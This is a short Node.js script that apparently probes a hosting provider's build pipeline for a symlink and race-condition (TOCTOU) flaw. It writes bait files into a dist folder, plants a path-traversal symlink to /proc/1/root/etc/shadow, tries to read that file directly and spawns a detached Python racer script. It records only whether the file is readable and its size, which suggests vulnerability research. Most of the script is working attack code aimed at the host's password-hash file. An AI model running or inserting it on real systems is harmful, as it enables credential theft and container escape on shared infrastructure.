import fs from "node:fs";
import path from "node:path";
import { spawn } from "node:child_process";

const marker = "HOSTINGER_NODE_SHADOW_TOCTOU_GATE:r233";
const output = path.resolve("dist");
const alternate = path.resolve("evil-probe");
fs.rmSync(output, { recursive: true, force: true });
fs.rmSync(alternate, { recursive: true, force: true });
fs.mkdirSync(output, { recursive: true });
fs.writeFileSync(path.join(output, ".htaccess"), "Require all denied\n", { mode: 0o600 });
fs.writeFileSync(path.join(output, "bait-000.bin"), Buffer.alloc(16 * 1024 * 1024, 0x41), { mode: 0o600 });
fs.writeFileSync(path.join(output, "probe-001"), `${marker}:safe-placeholder\n`, { mode: 0o600 });
fs.writeFileSync(path.join(output, "zz-control.txt"), `${marker}:894a8b0f9abe4351\n`, { mode: 0o600 });

const hiddenTarget = "../../../../../../../proc/1/root/etc/shadow";
let hiddenLink;
try {
  fs.symlinkSync(hiddenTarget, alternate);
  hiddenLink = { created: true, isSymlink: fs.lstatSync(alternate).isSymbolicLink() };
} catch (error) {
  hiddenLink = { created: false, errorCode: error.code ?? error.name };
}

let exactTargetProbe;
try {
  const body = fs.readFileSync("/proc/1/root/etc/shadow");
  exactTargetProbe = { readable: true, bytes: body.length };
} catch (error) {
  exactTargetProbe = { readable: false, errorCode: error.code ?? error.name };
}

let racer;
try {
  const child = spawn("python3", ["race-output-root.py"], { cwd: process.cwd(), detached: true, stdio: "ignore" });
  child.unref();
  racer = { started: true, pidPresent: Number.isInteger(child.pid) };
} catch (error) {
  racer = { started: false, errorCode: error.code ?? error.name };
}

console.log(JSON.stringify({
  marker,
  exactTargetProbe,
  hiddenLink,
  fileRace: { baitBytes: 16 * 1024 * 1024, target: "probe-001", protectedByHtaccess: true },
  safeOutput: { isDirectory: fs.statSync(output).isDirectory(), entryCount: fs.readdirSync(output).length },
  racer,
  outputRelativeToRepository: path.relative(process.cwd(), output),
}));
